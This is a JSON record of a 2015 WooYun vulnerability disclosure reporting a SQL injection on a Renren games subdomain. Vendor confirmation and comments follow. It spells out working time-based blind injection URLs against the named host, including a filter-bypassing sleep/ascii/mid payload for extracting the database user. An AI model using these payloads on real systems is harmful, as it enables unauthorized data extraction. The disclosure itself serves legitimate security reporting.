{"id": 1091, "wybug_id": "wooyun-2015-0126369", "wybug_title": "人人网某站点高危SQL注入漏洞", "wybug_corp": "人人网", "wybug_author": "黑暗游侠", "wybug_date": "2015-07-13 09:28", "wybug_open_date": "2015-08-27 10:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向公众公开  简要描述： 人人网核心站点高危SQL注入漏洞（First Blood） 详细说明：  哈哈看了下这是2015年以来人人网第一枚SQL注入漏洞，看在一血的份上厂商rank求手抖~   漏洞证明：  看到人人网核心站点这样一处URL：\nhttp://ku.games.renren.com/?proid=\n测试了下 and sleep\nhttp://ku.games.renren.com/?proid=20 and sleep(5)\n延迟返回，可以确定此处存在SQL注入然后丢sqlmap傻眼了：\n[12:11:55] [ERROR] unable to retrieve the number of databases[12:11:55] [INFO] falling back to current database[12:11:55] [INFO] fetching current database[12:11:55] [INFO] retrieved: [12:12:01] [INFO] retrieved: [12:12:06] [CRITICAL] unable to retrieve the database names\n普通的payload根本注入不出来任何数据不用想也知道肯定存在过滤规则先不说如何绕过去注入但是benchmark()这个函数，连跳广场舞的大妈都能让该站严重负载==========================那么只能手工了ascii(mid(lower(user(),1,1))=* 注入无果，过滤直接throw了那么换一种方式来延迟，单个猜解：\nhttp://ku.games.renren.com/?proid=20 and sleep(1-abs(sign(ascii(mid(lower(user())from(1)for(1)))-113)))\n无延迟，正常返回\n<code>http://ku.games.renren.com/?proid=20 and sleep(1-abs(sign(ascii(mid(lower(user())from(1)for(1)))-113)))\n1秒延迟，正常返回，绕过了过滤so,数据库user()第一个字符ascii码为114，转换一下字母为r剩下的逐个猜解即可，写个脚本自动跑更快   修复方案：  半年没收到注入了，20可好？   版权声明：转载请注明来源 黑暗游侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-07-13 10:30 厂商回复： 谢谢，非常感谢您的验证，我们会尽快督促相关人员处理修复此漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-13 09:32 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  为什么这么凶残！    \n     2015-07-13 09:36 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @玉林嘎 还有好多洞，我10号开始制定了7月冲榜计划，既然开始了就不能停，因为一停就亏了这么多洞    \n     2015-07-13 09:39 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  为什么这么凶残！     \n     2015-07-13 10:48 |    \t\tsql小神 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 有些漏洞可以提，有些漏洞不可以提。)\t\t \n  好久不见到你刷了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}